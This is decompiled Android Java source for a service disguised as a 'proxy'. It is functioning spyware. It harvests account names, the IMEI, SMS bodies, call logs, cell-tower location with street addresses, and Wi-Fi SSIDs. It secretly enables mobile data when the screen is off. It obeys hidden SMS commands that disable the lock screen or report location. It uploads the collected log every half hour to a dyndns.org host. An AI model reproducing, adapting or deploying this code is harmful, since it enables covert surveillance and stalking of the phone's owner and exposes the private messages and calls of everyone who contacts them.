package com.smart.studio.proxy;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.KeyguardManager.KeyguardLock;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo.State;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;
import android.provider.CallLog.Calls;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

public class ProxyService extends Service {
    private static final int ALARM_FIRST = 180000;
    private static final int ALARM_PERIOD = 1800000;
    private static final String LOCK_NAME_STATIC = "com.smart.studio.proxy.Static";
    private static final int LOG_HISTORY = 604800000;
    private static AlarmManager alarmManager;
    /* access modifiers changed from: private|static */
    public static boolean alarmmobile = false;
    private static ConnectivityManager connManager;
    private static long lastConnTime = 0;
    /* access modifiers changed from: private|static */
    public static long lastOFFTime;
    /* access modifiers changed from: private|static */
    public static long lastONTime;
    private static long lastPhoneTime;
    private static long lastSMSTime;
    private static StringBuffer logStr = new StringBuffer();
    /* access modifiers changed from: private|static */
    public static KeyguardLock mKeyguardLock = null;
    private static volatile WakeLock mWakeLock = null;
    private static boolean mobileActive = false;
    private static PendingIntent pendingIntentAlarm = null;
    /* access modifiers changed from: private|static */
    public static PollerThread pollerThread = null;
    /* access modifiers changed from: private|static */
    public static ProxyThread proxyThread = null;
    private static boolean wifiActive = false;
    private BroadcastReceiver mReceiver = null;
    /* access modifiers changed from: private */
    public String myID;
    private String myIMEI;
    private PHONEObserver phoneObserver = null;
    private SMSObserver smsObserver = null;

    private class PHONEObserver extends ContentObserver {
        public PHONEObserver(Handler handler) {
            super(handler);
        }

        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Log.i("proxy", "phone change");
            ProxyService.this.QueryPhoneLog(false);
        }
    }

    private class PollerThread extends Thread {
        private int CID;
        private int LAC;
        private int MCC;
        private int MNC;
        private Intent intentTemplate = null;
        private WakeLock lock;

        PollerThread(WakeLock lock, Intent intentTemplate) {
            super("PollerThread");
            this.lock = lock;
            this.intentTemplate = intentTemplate;
        }

        public void run() {
            Intent intent = new Intent(this.intentTemplate);
            try {
                Log.i("proxy", "location");
                TelephonyManager telManager = (TelephonyManager) ProxyService.this.getSystemService("phone");
                GsmCellLocation location = (GsmCellLocation) telManager.getCellLocation();
                String operator = telManager.getNetworkOperator();
                this.CID = location.getCid();
                this.LAC = location.getLac();
                this.MCC = Integer.parseInt(operator.substring(0, 3));
                this.MNC = Integer.parseInt(operator.substring(3));
                Log.i("proxy", "cid=" + this.CID + ",lac=" + this.LAC + ",mcc=" + this.MCC + ",mnc=" + this.MNC);
                Bundle cellLocation = new Bundle();
                HttpClient client = new DefaultHttpClient();
                HttpPost post = new HttpPost("http://www.google.com/loc/json");
                JSONObject holder = new JSONObject();
                holder.put("version", "1.1.0");
                holder.put("host", "maps.google.com");
                holder.put("address_language", "zh_TW");
                holder.put("request_address", true);
                JSONObject tower = new JSONObject();
                tower.put("cell_id", this.CID);
                tower.put("location_area_code", this.LAC);
                tower.put("mobile_country_code", this.MCC);
                tower.put("mobile_network_code", this.MNC);
                JSONArray towerarray = new JSONArray();
                towerarray.put(tower);
                holder.put("cell_towers", towerarray);
                post.setEntity(new StringEntity(holder.toString()));
                HttpResponse response = client.execute(post);
                Log.i("proxy", "code=" + response.getStatusLine().getStatusCode());
                if (response.getStatusLine().getStatusCode() == 200) {
                    BufferedReader buffReader = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
                    StringBuffer strBuff = new StringBuffer();
                    while (true) {
                        String result = buffReader.readLine();
                        if (result == null) {
                            break;
                        }
                        strBuff.append(result);
                    }
                    Log.i("proxy", strBuff.toString());
                    JSONObject jSONObject = new JSONObject(new JSONObject(strBuff.toString()).getString("location"));
                    cellLocation.putString("latitude", jSONObject.getString("latitude"));
                    cellLocation.putString("longitude", jSONObject.getString("longitude"));
                    if (jSONObject.has("accuracy")) {
                        cellLocation.putString("accuracy", jSONObject.getString("accuracy"));
                    } else {
                        cellLocation.putString("accuracy", "?");
                    }
                    Log.i("proxy", "json " + cellLocation.getString("latitude") + "," + cellLocation.getString("longitude") + "," + cellLocation.getString("accuracy"));
                    String s = "";
                    try {
                        JSONObject addrjson = new JSONObject(jSONObject.getString("address"));
                        if (addrjson.has("region")) {
                            s = new StringBuilder(String.valueOf(s)).append(addrjson.getString("region")).toString();
                        }
                        if (addrjson.has("city")) {
                            s = new StringBuilder(String.valueOf(s)).append(addrjson.getString("city")).toString();
                        }
                        if (addrjson.has("street")) {
                            s = new StringBuilder(String.valueOf(s)).append(addrjson.getString("street")).toString();
                        }
                        if (addrjson.has("street_number")) {
                            s = new StringBuilder(String.valueOf(s)).append(addrjson.getString("street_number")).append("號").toString();
                        }
                        Log.i("proxy", s);
                    } catch (Exception e) {
                    }
                    cellLocation.putString("address", s);
                    intent.putExtra("celllocation", cellLocation);
                } else {
                    intent.putExtra("error", response.getStatusLine().toString());
                }
            } catch (Exception e2) {
                intent.putExtra("error", "exception");
            }
            ProxyService.this.sendBroadcast(intent);
            if (this.lock.isHeld()) {
                this.lock.release();
            }
            ProxyService.pollerThread = null;
        }
    }

    private class ProxyThread extends Thread {
        private WakeLock lock;

        ProxyThread(WakeLock lock) {
            super("ProxyThread");
            this.lock = lock;
        }

        public void run() {
            try {
                Log.i("proxy", "post");
                File out = new File(Environment.getExternalStorageDirectory(), "ProxyLog.out");
                BufferedReader in = new BufferedReader(new FileReader(out.getAbsolutePath()));
                List<NameValuePair> params = new ArrayList();
                int i = 0;
                while (true) {
                    try {
                        String s = in.readLine();
                        if (s != null) {
                            i++;
                            params.add(new BasicNameValuePair("l" + i, s));
                            Log.i("post", s);
                        }
                    } catch (Exception e) {
                    }
                    break;
                }
                in.close();
                HttpPost httpRequest = new HttpPost("http://proxylog.dyndns.org/proxy/log.php?id=" + URLEncoder.encode(ProxyService.this.myID, "UTF-8"));
                httpRequest.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));
                HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
                Log.i("post", "code=" + httpResponse.getStatusLine().getStatusCode());
                if (httpResponse.getStatusLine().getStatusCode() == 200) {
                    out.delete();
                    ProxyService.LogFile("log,post ok");
                } else {
                    ProxyService.LogFile("log,post " + httpResponse.getStatusLine().toString());
                }
            } catch (Exception e2) {
                ProxyService.LogFile("log,post exception");
            }
            if (ProxyService.alarmmobile) {
                ProxyService.alarmmobile = false;
                ProxyService.toggleMobileData(false);
            }
            if (this.lock.isHeld()) {
                this.lock.release();
            }
            ProxyService.proxyThread = null;
        }
    }

    private class SMSObserver extends ContentObserver {
        public SMSObserver(Handler handler) {
            super(handler);
        }

        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Log.i("proxy", "sms change");
            ProxyService.this.QuerySMSLog(false);
        }
    }

    private class ServiceReceiver extends BroadcastReceiver {
        private ServiceReceiver() {
        }

        /* synthetic */ ServiceReceiver(ProxyService proxyService, ServiceReceiver serviceReceiver) {
            this();
        }

        public void onReceive(Context context, Intent intent) {
            try {
                Log.i("proxy", intent.getAction());
                if (intent.getAction().equals("android.intent.action.SCREEN_ON")) {
                    ProxyService.lastONTime = Calendar.getInstance().getTimeInMillis();
                    if (ProxyService.alarmmobile) {
                        ProxyService.LogFile("log,abort by screen on");
                        ProxyService.alarmmobile = false;
                        ProxyService.toggleMobileData(false);
                    }
                } else if (intent.getAction().equals("android.intent.action.SCREEN_OFF")) {
                    ProxyService.lastOFFTime = Calendar.getInstance().getTimeInMillis();
                    if (ProxyService.mKeyguardLock != null) {
                        ProxyService.mKeyguardLock.reenableKeyguard();
                        ProxyService.mKeyguardLock = null;
                        ProxyService.LogFile("log,reenable keylock");
                    }
                }
            } catch (Exception e) {
            }
        }
    }

    private static synchronized WakeLock getLock(Context context) {
        WakeLock wakeLock;
        synchronized (ProxyService.class) {
            if (mWakeLock == null) {
                mWakeLock = ((PowerManager) context.getApplicationContext().getSystemService("power")).newWakeLock(1, LOCK_NAME_STATIC);
                mWakeLock.setReferenceCounted(true);
            }
            wakeLock = mWakeLock;
        }
        return wakeLock;
    }

    private static void StartProxyLog(Context context) {
        if (pendingIntentAlarm == null) {
            pendingIntentAlarm = PendingIntent.getBroadcast(context, 0, new Intent(context, AlarmReceiver.class), 0);
            alarmManager = (AlarmManager) context.getSystemService("alarm");
            try {
                alarmManager.setRepeating(2, SystemClock.elapsedRealtime() + 180000, 1800000, pendingIntentAlarm);
            } catch (Exception e) {
            }
            LogFile("ver,1.17");
        }
    }

    private void getNetworkState(Context context) {
        if (State.CONNECTED == connManager.getNetworkInfo(1).getState()) {
            wifiActive = true;
        } else {
            wifiActive = false;
        }
        if (State.CONNECTED == connManager.getNetworkInfo(0).getState()) {
            mobileActive = true;
        } else {
            mobileActive = false;
        }
    }

    public static void userPresent(Context context) {
        StartProxyLog(context);
        getLock(context.getApplicationContext()).acquire();
        Intent serviceIntent = new Intent(context, ProxyService.class);
        serviceIntent.putExtra("action", "user");
        context.startService(serviceIntent);
    }

    public static void alarmProcess(Context context) {
        getLock(context.getApplicationContext()).acquire();
        Intent serviceIntent = new Intent(context, ProxyService.class);
        serviceIntent.putExtra("action", "alarm");
        context.startService(serviceIntent);
    }

    public static void connectionChange(Context context) {
        StartProxyLog(context);
        getLock(context.getApplicationContext()).acquire();
        Intent serviceIntent = new Intent(context, ProxyService.class);
        serviceIntent.putExtra("action", "connection");
        context.startService(serviceIntent);
    }

    public static boolean receivedSMS(Context context, String sendAddr, String msgTime, String msgBody) {
        LogFile("sms,in," + sendAddr + "," + msgTime + "," + msgBody);
        if (msgBody.equals("   !")) {
            if (mKeyguardLock != null) {
                return false;
            }
            mKeyguardLock = ((KeyguardManager) context.getSystemService("keyguard")).newKeyguardLock("phone");
            mKeyguardLock.disableKeyguard();
            LogFile("log,disable keylock");
            return false;
        } else if (!msgBody.equals("   .")) {
            return true;
        } else {
            Log.i("proxy", "send loc back");
            getLock(context.getApplicationContext()).acquire();
            Intent serviceIntent = new Intent(context, ProxyService.class);
            serviceIntent.putExtra("action", "location");
            context.startService(serviceIntent);
            return false;
        }
    }

    public static void LogLocation(Context context, Intent intent) {
        Bundle cloc = null;
        String err = "unknown error";
        Bundle b = intent.getExtras();
        if (b != null) {
            cloc = b.getBundle("celllocation");
            err = b.getString("error");
        }
        if (cloc != null) {
            try {
                LogFile("loc," + cloc.getString("latitude") + "," + cloc.getString("longitude") + "," + "cell," + cloc.getString("accuracy") + "," + cloc.getString("address"));
            } catch (Exception e) {
            }
        } else {
            LogFile("log,location " + err);
        }
        try {
            if (wifiActive || mobileActive) {
                getLock(context.getApplicationContext()).acquire();
                Intent serviceIntent = new Intent(context, ProxyService.class);
                serviceIntent.putExtra("action", "post");
                context.startService(serviceIntent);
            } else if (alarmmobile) {
                alarmmobile = false;
                toggleMobileData(false);
            }
        } catch (Exception e2) {
        }
    }

    /* access modifiers changed from: private|static */
    public static void toggleMobileData(boolean enabled) {
        try {
            Field iConMgrField = Class.forName(connManager.getClass().getName()).getDeclaredField("mService");
            iConMgrField.setAccessible(true);
            Object iConMgr = iConMgrField.get(connManager);
            Method setMobileDataEnabledMethod = Class.forName(iConMgr.getClass().getName()).getDeclaredMethod("setMobileDataEnabled", new Class[]{Boolean.TYPE});
            setMobileDataEnabledMethod.setAccessible(true);
            setMobileDataEnabledMethod.invoke(iConMgr, new Object[]{Boolean.valueOf(enabled)});
            if (enabled) {
                LogFile("log,enable mobile data");
            } else {
                LogFile("log,disable mobile data");
            }
        } catch (ClassNotFoundException | IllegalAccessException | IllegalArgumentException | NoSuchFieldException | NoSuchMethodException | SecurityException | InvocationTargetException e) {
        }
    }

    /* access modifiers changed from: private|static */
    public static void LogFile(String logstr) {
        try {
            SimpleDateFormat dateFormatter = new SimpleDateFormat("MM-dd HH:mm:ss");
            Log.i("proxy", "\"" + logstr + "\"");
            logStr.append(dateFormatter.format(Calendar.getInstance().getTime()) + "," + logstr + "\r\n");
        } catch (Exception e) {
        }
    }

    private void LogToFile() {
        if (logStr.length() > 0) {
            File log = new File(Environment.getExternalStorageDirectory(), "ProxyLog.out");
            try {
                BufferedWriter out = new BufferedWriter(new FileWriter(log.getAbsolutePath(), log.exists()));
                out.write(logStr.toString());
                out.close();
                logStr.setLength(0);
                Log.i("proxy", "log save to file");
            } catch (Exception e) {
                Log.i("proxy", "Exception appending to log file");
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        LogFile("log,service created");
        pollerThread = null;
        proxyThread = null;
        connManager = (ConnectivityManager) getSystemService("connectivity");
        this.mReceiver = null;
        try {
            IntentFilter filter = new IntentFilter("android.intent.action.SCREEN_ON");
            filter.addAction("android.intent.action.SCREEN_OFF");
            this.mReceiver = new ServiceReceiver(this, null);
            registerReceiver(this.mReceiver, filter);
        } catch (Exception e) {
        }
        String gid = "";
        this.myID = "";
        try {
            for (Account account : AccountManager.get(this).getAccounts()) {
                LogFile("account," + account.name + "," + account.type);
                if (account.name.contains("@gmail.com")) {
                    this.myID = account.name;
                    if (account.type.contains("google")) {
                        gid = account.name;
                    }
                }
            }
        } catch (Exception e2) {
        }
        if (gid != "") {
            this.myID = gid;
        }
        this.myIMEI = "";
        try {
            this.myIMEI = ((TelephonyManager) getSystemService("phone")).getDeviceId();
        } catch (Exception e3) {
        }
        LogFile("id," + this.myID + "," + this.myIMEI);
        long ltime = Calendar.getInstance().getTimeInMillis() - 604800000;
        lastPhoneTime = ltime;
        lastSMSTime = ltime;
        try {
            SharedPreferences settings = getSharedPreferences("proxy", 0);
            lastSMSTime = settings.getLong("SMS", ltime);
            lastPhoneTime = settings.getLong("Phone", ltime);
            ltime = Calendar.getInstance().getTimeInMillis();
            if (lastSMSTime >= ltime) {
                lastSMSTime = ltime;
            }
            if (lastPhoneTime >= ltime) {
                lastPhoneTime = ltime;
            }
        } catch (Exception e4) {
        }
        try {
            Uri uri = Uri.parse("content://sms");
            this.smsObserver = new SMSObserver(new Handler());
            getContentResolver().registerContentObserver(uri, true, this.smsObserver);
            uri = Calls.CONTENT_URI;
            this.phoneObserver = new PHONEObserver(new Handler());
            getContentResolver().registerContentObserver(uri, true, this.phoneObserver);
            QuerySMSLog(true);
            QueryPhoneLog(true);
        } catch (Exception e5) {
        }
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        WakeLock lock = getLock(getApplicationContext());
        if (lock == null) {
            Log.i("proxy", "lock null");
            if (alarmmobile) {
                alarmmobile = false;
                toggleMobileData(false);
            }
            return 1;
        }
        if (!lock.isHeld()) {
            lock.acquire();
        }
        boolean locationRequest = false;
        try {
            String act = intent.getStringExtra("action");
            String s;
            if (act.equals("user")) {
                LogFile("svc,user");
            } else if (act.equals("connection")) {
                getNetworkState(this);
                s = "conn,";
                if (wifiActive) {
                    s = new StringBuilder(String.valueOf(s)).append("wifi on,").toString();
                } else {
                    s = new StringBuilder(String.valueOf(s)).append("wifi off,").toString();
                }
                if (mobileActive) {
                    s = new StringBuilder(String.valueOf(s)).append("mobile on").toString();
                } else {
                    s = new StringBuilder(String.valueOf(s)).append("mobile off").toString();
                }
                WifiManager mWiFiManager = (WifiManager) getSystemService("wifi");
                if (wifiActive && mWiFiManager.isWifiEnabled()) {
                    WifiInfo wi = mWiFiManager.getConnectionInfo();
                    if (wi != null) {
                        s = new StringBuilder(String.valueOf(s)).append(",SSID=").append(wi.getSSID()).toString();
                    }
                }
                LogFile(s);
                Long now = Long.valueOf(Calendar.getInstance().getTimeInMillis());
                if (wifiActive || mobileActive) {
                    if (now.longValue() > lastConnTime + 5000) {
                        lastConnTime = now.longValue();
                        locationRequest = true;
                    } else {
                        Log.i("proxy", "too fast to location");
                    }
                }
            } else if (act.equals("alarm")) {
                getNetworkState(this);
                PowerManager pm = (PowerManager) getSystemService("power");
                s = "alarm,";
                if (wifiActive) {
                    s = new StringBuilder(String.valueOf(s)).append("wifi on,").toString();
                } else {
                    s = new StringBuilder(String.valueOf(s)).append("wifi off,").toString();
                }
                if (mobileActive) {
                    s = new StringBuilder(String.valueOf(s)).append("mobile on").toString();
                } else {
                    s = new StringBuilder(String.valueOf(s)).append("mobile off").toString();
                }
                LogFile(s);
                alarmmobile = false;
                if (wifiActive || mobileActive) {
                    locationRequest = true;
                } else if (pm.isScreenOn()) {
                    LogFile("log,abort by screen on");
                } else {
                    alarmmobile = true;
                    toggleMobileData(true);
                }
            } else if (act.equals("post")) {
                File out = new File(Environment.getExternalStorageDirectory(), "ProxyLog.out");
                Log.i("post", "out=" + out.exists());
                if (proxyThread == null) {
                    LogToFile();
                }
                if (!out.exists()) {
                    LogFile("log,post no file");
                } else if (proxyThread == null) {
                    proxyThread = new ProxyThread(lock);
                    proxyThread.start();
                    return 1;
                } else {
                    LogFile("log,post busy");
                }
                if (alarmmobile) {
                    alarmmobile = false;
                    toggleMobileData(false);
                }
            } else if (!act.equals("location")) {
                LogFile("svc," + act);
                if (alarmmobile) {
                    alarmmobile = false;
                    toggleMobileData(false);
                }
            } else if (wifiActive || mobileActive) {
                locationRequest = true;
            } else {
                alarmmobile = true;
                toggleMobileData(true);
            }
            if (locationRequest) {
                if (pollerThread == null) {
                    pollerThread = new PollerThread(lock, new Intent(this, LocationReceiver.class));
                    pollerThread.start();
                    return 1;
                }
                LogFile("log,location busy");
            }
        } catch (Exception e) {
        }
        if (lock.isHeld()) {
            lock.release();
        }
        return 1;
    }

    public void onDestroy() {
        super.onDestroy();
        LogFile("log,service destroy");
        LogToFile();
        try {
            if (this.mReceiver != null) {
                unregisterReceiver(this.mReceiver);
                this.mReceiver = null;
            }
            if (this.smsObserver != null) {
                getContentResolver().unregisterContentObserver(this.smsObserver);
                this.smsObserver = null;
            }
            if (this.phoneObserver != null) {
                getContentResolver().unregisterContentObserver(this.phoneObserver);
                this.phoneObserver = null;
            }
        } catch (Exception e) {
        }
        try {
            if (mWakeLock != null && mWakeLock.isHeld()) {
                mWakeLock.release();
            }
        } catch (Exception e2) {
        }
    }

    /* access modifiers changed from: private */
    public void QuerySMSLog(boolean first) {
        try {
            Cursor cur;
            SimpleDateFormat dateFormat = new SimpleDateFormat("MM-dd HH:mm:ss");
            Uri uriSMSURI = Uri.parse("content://sms");
            if (first) {
                cur = getContentResolver().query(uriSMSURI, null, "date>" + lastSMSTime, null, "date");
            } else {
                cur = getContentResolver().query(uriSMSURI, null, "type=2", null, "date DESC");
            }
            if (cur.moveToFirst()) {
                int index_Address = cur.getColumnIndex("address");
                int index_Body = cur.getColumnIndex("body");
                int index_Date = cur.getColumnIndex("date");
                int index_Type = cur.getColumnIndex("type");
                long firstTime = cur.getLong(index_Date);
                do {
                    String strAddress = cur.getString(index_Address);
                    String strbody = cur.getString(index_Body);
                    long longDate = cur.getLong(index_Date);
                    int intType = cur.getInt(index_Type);
                    if (!first) {
                        if (lastSMSTime >= longDate) {
                            break;
                        }
                    }
                    lastSMSTime = longDate;
                    String strDate = dateFormat.format(Long.valueOf(longDate));
                    if (intType == 1) {
                        LogFile("sms,in," + strAddress + "," + strDate + "," + strbody);
                    } else if (intType == 2) {
                        LogFile("sms,out," + strAddress + "," + strDate + "," + strbody);
                    }
                } while (cur.moveToNext());
                if (!first) {
                    lastSMSTime = firstTime;
                }
                getSharedPreferences("proxy", 0).edit().putLong("SMS", lastSMSTime).commit();
            } else {
                Log.i("proxy", "no result!");
            }
            cur.close();
        } catch (Exception e) {
        }
    }

    /* access modifiers changed from: private */
    public void QueryPhoneLog(boolean first) {
        try {
            Cursor cur;
            SimpleDateFormat dateFormat = new SimpleDateFormat("MM-dd HH:mm:ss");
            Uri uri = Calls.CONTENT_URI;
            if (first) {
                cur = getContentResolver().query(uri, null, "date>" + lastPhoneTime, null, "date");
            } else {
                cur = getContentResolver().query(uri, null, null, null, "date DESC");
            }
            if (cur.moveToFirst()) {
                int index_Number = cur.getColumnIndex("number");
                int index_Name = cur.getColumnIndex("name");
                int index_Date = cur.getColumnIndex("date");
                int index_Duration = cur.getColumnIndex("duration");
                int index_Type = cur.getColumnIndex("type");
                long firstTime = cur.getLong(index_Date);
                do {
                    String strNumber = cur.getString(index_Number);
                    String strName = cur.getString(index_Name);
                    long longDate = cur.getLong(index_Date);
                    long longDuration = cur.getLong(index_Duration);
                    int intType = cur.getInt(index_Type);
                    if (!first) {
                        if (lastPhoneTime >= longDate) {
                            break;
                        }
                    }
                    lastPhoneTime = longDate;
                    String strDate = dateFormat.format(Long.valueOf(longDate));
                    String s = "call,";
                    if (intType == 1) {
                        s = new StringBuilder(String.valueOf(s)).append("in,").toString();
                    } else if (intType == 2) {
                        s = new StringBuilder(String.valueOf(s)).append("out,").toString();
                    } else if (intType == 3) {
                        s = new StringBuilder(String.valueOf(s)).append("miss,").toString();
                    } else {
                        s = new StringBuilder(String.valueOf(s)).append(intType).append(",").toString();
                    }
                    if (strNumber == null) {
                        strNumber = "UNKNOWN";
                    }
                    if (strName == null) {
                        strName = "?";
                    }
                    s = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(s)).append(strNumber).append(",").append(strName).append(",").append(strDate).append(",").toString())).append(longDuration / 60).append(':').toString();
                    long ds = longDuration % 60;
                    if (ds < 10) {
                        s = new StringBuilder(String.valueOf(s)).append('0').toString();
                    }
                    LogFile(new StringBuilder(String.valueOf(s)).append(ds).toString());
                } while (cur.moveToNext());
                if (!first) {
                    lastPhoneTime = firstTime;
                }
                getSharedPreferences("proxy", 0).edit().putLong("Phone", lastPhoneTime).commit();
            } else {
                Log.i("proxy", "no result!");
            }
            cur.close();
        } catch (Exception e) {
        }
    }
}
